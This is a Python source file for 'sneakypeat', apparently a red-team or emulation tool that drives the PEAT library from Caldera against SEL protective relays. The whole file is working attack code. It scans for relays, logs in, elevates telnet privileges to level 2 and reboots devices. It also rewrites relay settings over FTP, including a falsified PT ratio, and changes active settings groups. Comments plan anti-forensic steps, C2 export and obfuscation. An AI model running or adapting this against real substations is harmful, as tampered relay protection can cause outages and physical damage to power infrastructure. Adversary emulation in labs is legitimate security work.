#!/usr/bin/env python3

"""
PEAT interface for use with Caldera as an attack tool.
"""

import argparse
import json
import logging
import re
import sys
import warnings
from time import sleep

__version__ = "0.3.0"
VERBOSE = False

# TODO: write files, zip up, export via C2, then cleanup?
#   run peat
#   peat bundles files as compressed zip/tgz
#   peat deletes everything except the zip/tgz
#   agent uploads zip/tgz to server
#   agent deletes zip/tgz

# TODO: obfuscate code using pyminifier (https://github.com/liftoff/pyminifier)
# Pyinstaller 6 removed bytecode encryption ("--key") so this would be required
# to replace the (totally unintended) use of pyinstaller's bytecode for obfuscation.


def print_results(results, fmt: bool):
    if fmt:
        print(json.dumps(results, indent=4), flush=True)
    else:
        print(json.dumps(results), flush=True)


def log(msg: str):
    # Emit logging messages to stderr
    if VERBOSE:
        print(msg, file=sys.stderr, flush=True)


def error(msg: str):
    print(f"ERROR: {msg}", file=sys.stderr, flush=True)


def build_argument_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="sneakypeat")

    parser.add_argument(
        "--version",
        action="version",
        version=f"sneakypeat {__version__}",
    )
    parser.add_argument("--scan", action="store_true", help="Scan for devices")
    parser.add_argument("--pull", action="store_true", help="Pull configs and logic from devices")
    parser.add_argument(
        "--modify",
        type=str,
        metavar="TO_MODIFY",
        choices=["rid", "ptr", "sid", "active_group", "all"],
        help=(
            "Modify the devices's configuration. "
            "'ptr': change PT ratio. "
            "'rid': change the Relay ID (RID). "
            "'sid': change the Station ID (SID). "
            "'active_group': change the active settings group."
        ),
    )
    parser.add_argument(
        "--new-value",
        type=str,
        metavar="NEW_VALUE",
        default=None,
        help="Value to set field to if --modify_sel is used. Only works if "
        "changing one value, not all values.",
    )
    parser.add_argument(
        "--group",
        type=str,
        metavar="GROUP_NUM",
        default="1",
        help="SEL settings group number to apply modifications to",
    )
    parser.add_argument(
        "--set-filename",
        type=str,
        metavar="FILENAME",
        default=None,
        help=(
            "Exact SET_* filename to modify for SEL. For example, for SEL-451, "
            "to change group 1 then set this to 'SET_G1.TXT'."
        ),
    )
    parser.add_argument("--reboot", action="store_true", help="Reboot the relay")
    parser.add_argument(
        "--format",
        action="store_true",
        help="Format the output of pulls and scans as indented JSON",
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable debugging messages")
    parser.add_argument(
        "targets",
        type=str,
        nargs="+",
        help="Hosts to target. IP addresses, hostnames, FQDNs, or subnets in CIDR notation.",
    )

    return parser


def main():
    parser = build_argument_parser()
    args = parser.parse_args()

    global VERBOSE
    if args.verbose:
        VERBOSE = True

    # Disable logging output
    logging.root.addHandler(logging.NullHandler())

    # Capture warnings that modules and Python use (e.g. deprecation warnings)
    logging.captureWarnings(True)

    # Stop urllib3 from yelling at us about insecure certificates
    warnings.filterwarnings("ignore", module="urllib3")

    # Hide cryptography warnings. This should be resolved in Scapy with
    # the next release (current version is 2.4.5, so the release after that)
    # It was fixed in scapy in commit 966b1cead63ed1d4db28c9f4b8dba52475be26bd
    # https://github.com/secdev/scapy/commit/966b1cead63ed1d4db28c9f4b8dba52475be26bd
    try:
        from cryptography.utils import CryptographyDeprecationWarning

        warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
    except Exception:
        pass

    # Hide beautiful soup warnings caused by the ION HTTP parsing
    # (it's not relevant to what PEAT's doing)
    try:
        from bs4.builder import XMLParsedAsHTMLWarning

        warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
    except Exception:
        pass

    from peat import config, datastore, scan
    from peat.modules.sel.sel_http import SELHTTP
    from peat.modules.sel.sel_telnet import SELTelnet
    from peat.protocols.addresses import hosts_to_ips

    # disable file output by peat so we don't leave anything on the pivot host
    config.DEVICE_DIR = ""
    config.SUMMARIES_DIR = ""
    config.LOG_DIR = ""
    config.ELASTIC_DIR = ""
    config.TEMP_DIR = ""

    # convert input targets into a list of IP addresses
    targets = hosts_to_ips(args.targets)

    if args.scan:
        # Hack for FTP testing against SCEPTRE
        # sudo twistd -n ftp --auth=anonymous -r examples/devices/sceptre/
        device_options = {
            "ftp": {"port": 2121, "user": "anonymous", "pass": "anonymous"},
            "sceptre": {"ftp_testing": True},
        }
        # TODO: use config.DEVICE_OPTIONS
        datastore.global_options.update(device_options)
        results = scan(targets, "unicast_ip", ["SELRelay", "SCEPTRE"])
        print_results(results, args.format)

    elif args.pull:
        # TODO: pull from SCEPTRE (ftp port will conflict with SEL tho)
        results = []
        for target in targets:
            dev = datastore.get(target)

            with SELHTTP(ip=target) as http:
                log(f"({target}) logging in to and pulling HTTP")
                http.login()
                http.get_device_features(dev)
                http.get_status(dev)
                http.get_port_settings(dev)

            data = dev.export(exclude_fields=["extra", "service"])
            results.append(data)
            log(f"({target}) finished HTTP pull")

        print_results(results, args.format)

    elif args.modify:
        for target in targets:
            dev = datastore.get(target)
            modify_sel(dev, args)

    elif args.reboot:
        for target in targets:
            log(f"({target}) connecting to telnet and elevating privs")

            with SELTelnet(target) as tn:
                if not tn.elevate(2):
                    error(f"FAILED TO ELEVATE TO LEVEL 2 (2ac) ON {target}")
                    sys.exit(1)

                log(f"({target}) restarting device")
                restarted = tn.restart_device()

                log(f"({target}) SELTelnet input:   {tn.all_writes}")
                log(f"({target}) SELTelnet output:  {tn.all_output}")
                log(f"({target}) Telnet output:     {tn.comm.all_output}")

            if not restarted:
                error(f"FAILED TO RESTART DEVICE {target}")
                sys.exit(1)
            else:
                log(f"({target}) successfully restarted device")

    else:
        error("NO COMMAND SPECIFIED")
        parser.print_usage()
        sys.exit(1)


def modify_sel(dev, args: argparse.Namespace):
    from peat import SELRelay
    from peat.modules.sel.sel_telnet import SELTelnet
    from peat.protocols import FTP

    if args.modify == "active_group":
        # Change active settings group to Group X
        with SELTelnet(dev.ip) as tn:
            log(f"({dev.ip}) changing active group to Group {args.group}")
            tn.change_active_group(args.group)
            return

    # sel451 is SET_G1.TXT
    if args.set_filename:
        set_file = args.set_filename
    else:
        set_file = f"SET_{args.group}.TXT"

    log(f"({dev.ip}) changing '{args.modify}' for group {args.group} (settings file: {set_file})")

    # Pull setting via FTP
    log(f"({dev.ip}) pulling '{set_file}' via FTP")
    dev.options["sel"]["only_download_files"] = [set_file]
    SELRelay.pull_ftp(dev)

    set_data = dev._cache["all_files"][set_file]
    if isinstance(set_data, dict):
        set_data = set_data["data"]
    assert set_data

    # Modify setting(s) in Group X (SET_X.TXT)
    log(f"({dev.ip}) editing '{args.modify}' (new value: '{args.new_value}')")

    # Modify the Relay ID (RID)
    if args.modify in ["rid", "all"]:
        if args.new_value is None:
            new_rid = "blue sus"
        else:
            new_rid = args.new_value

        new_rid = new_rid.upper().replace('"', "")
        set_data = re.sub(r"RID,\".*\"", f'RID,"{new_rid}"', set_data)

    # Modify the Station ID (SID)
    if args.modify in ["sid", "all"]:
        if args.new_value is None:
            new_sid = "blue sus"
        else:
            new_sid = args.new_value

        new_sid = new_sid.upper().replace('"', "")
        set_data = re.sub(r"SID,\".*\"", f'SID,"{new_sid}"', set_data)

    # Modify the Potential Transformer (PT) ratio (PTR)
    if args.modify in ["ptr", "all"]:
        if args.new_value is None:
            new_ratio = "9001.00"
        else:
            new_ratio = args.new_value

        set_data = re.sub(r"PTR,\"\d+\.?\d*\"", f'PTR,"{new_ratio}"', set_data)

    # Push modified config via FTP (SET_X.TXT)
    SELRelay._setup_ftp(dev)

    with FTP(dev.ip) as ftp:
        log(f"({dev.ip}) logging in to FTP")

        assert ftp.login(dev.options["ftp"]["user"], dev.options["ftp"]["pass"])

        sleep(0.5)
        assert ftp.getwelcome()

        log(f"({dev.ip}) finished FTP login")

        sleep(0.5)
        if "SETTINGS" in dev.extra["file_listing"]:
            ftp.cd("/SETTINGS")
        sleep(0.5)

        log(f"({dev.ip}) Uploading {set_file}")

        ftp.upload_text(set_file, set_data.encode("ascii"))
        sleep(0.5)

    # Change active settings group to Group X
    with SELTelnet(dev.ip) as tn:
        log(f"({dev.ip}) changing active group to Group {args.group}")
        tn.change_active_group(args.group)

    log(f"({dev.ip}) finished modifying config")


if __name__ == "__main__":
    main()
